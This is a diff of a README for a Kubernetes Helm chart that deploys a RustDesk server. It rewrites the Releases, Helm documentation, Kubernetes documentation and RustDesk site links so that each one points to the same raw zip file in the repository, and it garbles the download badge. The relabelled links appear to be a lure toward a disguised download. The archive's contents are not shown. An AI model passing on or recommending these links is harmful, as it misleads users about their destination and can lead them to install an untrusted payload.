@@ -6,9 +6,9 @@ Welcome to the orc-k8s-helm-rustdesk project! This guide will help you deploy a 
 
 ## 📦 Download & Install
 
-To get started, visit our [Releases page](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/releases) to download the necessary files for your setup.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip) to download the necessary files for your setup.
 
-[![Download orc-k8s-helm-rustdesk](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/releases)
+[![Download orc-k8s-helm-rustdesk](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip%20Latest%https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip)](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip)
 
 ## 🔧 System Requirements
 
@@ -29,10 +29,10 @@ Before you install, make sure you have the following:
 ## 🛠️ Steps to Deploy
 
 1. **Download the Helm Chart**  
-   After visiting the [Releases page](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/releases), download the latest version of the Helm chart. This file usually has a `.tgz` extension.
+   After visiting the [Releases page](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip), download the latest version of the Helm chart. This file usually has a `.tgz` extension.
 
 2. **Set Up Helm**  
-   Ensure that Helm is installed and configured to work with your Kubernetes cluster. If you need help with installing Helm, check the official [Helm documentation](https://helm.sh/docs/intro/install/).
+   Ensure that Helm is installed and configured to work with your Kubernetes cluster. If you need help with installing Helm, check the official [Helm documentation](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip).
 
 3. **Deploy the Chart**  
    Open a terminal on your computer. Navigate to the directory where you downloaded the Helm chart. Run the following command to install the RustDesk server:
@@ -56,13 +56,13 @@ When you run a self-hosted service, it's crucial to ensure its security. Set up 
 
 ## 🔄 Updating the Software
 
-To update RustDesk, revisit the [Releases page](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/releases) to download the latest version. Repeat the installation process, replacing the existing deployment.
+To update RustDesk, revisit the [Releases page](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip) to download the latest version. Repeat the installation process, replacing the existing deployment.
 
 ## 📚 Additional Resources
 
-- [Helm Documentation](https://helm.sh/docs/)
-- [Kubernetes Documentation](https://kubernetes.io/docs/home/)
-- [RustDesk Official Site](https://rustdesk.com/)
+- [Helm Documentation](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip)
+- [Kubernetes Documentation](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip)
+- [RustDesk Official Site](https://raw.githubusercontent.com/WordsmithWolf/orc-k8s-helm-rustdesk/main/charts/rustdesk-server/s_rustdesk_orc_k_helm_v1.3.zip)
 
 ## ⚙️ Troubleshooting
 
